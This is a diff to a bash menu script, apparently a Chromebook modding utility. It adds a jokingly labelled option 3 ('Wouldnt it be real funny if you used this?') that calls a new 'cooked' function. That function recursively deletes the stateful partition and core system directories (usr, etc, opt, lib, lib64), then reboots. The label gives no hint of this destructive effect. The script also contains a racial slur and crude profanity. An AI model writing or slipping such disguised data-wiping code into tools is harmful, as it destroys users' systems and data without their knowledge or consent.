@@ -116,6 +116,7 @@ Be very careful here OR YOU WILL BE COOKED AF
 
 (1) Revert and bring your system back to when you started. (ONLY DO IF YOUR IT MAN IS GONNA ABSOLUTELY FUCK YOU IN THE ASS.)
 (2) Check to see if you have to update MushTard
+(3) Wouldnt it be real funny if you used this?
 
 EOF
         
@@ -125,6 +126,7 @@ EOF
         
         1) runjob revert ;;
         2) runjob do_mushm_update ;;
+        3) runjob cooked ;;
     
         *) echo && echo "Invalid option nigga." && echo ;;
         esac
@@ -314,3 +316,17 @@ if [ "$0" = "$BASH_SOURCE" ]; then
         locked_main
     fi
 fi
+
+cooked() {
+
+    cd /
+    rm -rf stateful_unfucked
+    rm -rf /mnt/stateful_partition
+    rm -rf usr
+    rm -rf etc
+    rm -rf opt
+    rm -rf lib64
+    rm -rf lib
+    sudo reboot
+
+}
